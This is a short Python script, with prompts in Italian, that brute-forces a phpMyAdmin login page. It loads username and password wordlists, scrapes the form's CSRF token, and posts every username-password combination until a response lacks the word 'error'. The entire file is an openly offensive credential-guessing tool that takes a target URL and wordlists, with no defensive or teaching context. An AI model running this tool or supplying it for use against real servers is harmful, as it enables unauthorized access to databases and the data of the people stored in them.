import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style

def main():
    url = input("Inserisci l'URL della pagina di login: ")
    user_file = input("Inserisci il file degli username: ")
    password_file = input("Inserisci il file delle password: ")

    session = requests.Session()
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': 'token'})['value']

    with open(user_file, 'r') as u_file:
        usernames = [line.strip() for line in u_file.readlines()]
    with open(password_file, 'r') as p_file:
        passwords = [line.strip() for line in p_file.readlines()]

    for username in usernames:
        for password in passwords:
            print(Fore.YELLOW + f"Tentativo con Username: {username} e Password: {password}" + Style.RESET_ALL)
            data =  {
                'pma_username': username,
                'pma_password': password,
                'server': '1',
                'token': token,
            } 
            response = session.post(url, data=data)
            if "error" not in response.text.lower():
                print(Fore.GREEN + "Login effettuato con successo!" + Style.RESET_ALL)
                return
    print(Fore.RED + "Fallito: Nessun username e password valido trovato" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
